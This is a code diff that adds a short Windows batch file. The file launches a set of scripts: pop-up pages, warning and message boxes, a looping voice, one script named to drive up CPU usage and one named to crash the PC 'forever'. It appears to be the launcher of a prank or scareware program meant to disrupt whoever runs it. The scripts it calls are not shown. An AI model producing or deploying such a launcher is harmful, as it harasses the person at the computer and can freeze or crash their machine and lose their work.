@@ -1,0 +1,10 @@
+@echo off
+start run_pages.vbs
+start run_Warning.vbs
+start mensaje1.vbs
+start mensaje2.vbs
+start mensaje3.vbs
+start mensaje4.vbs
+start voice_loop.vbs
+start incrementar_usoDe_cpu.bat
+start crashear_pc_para_siempre.bat
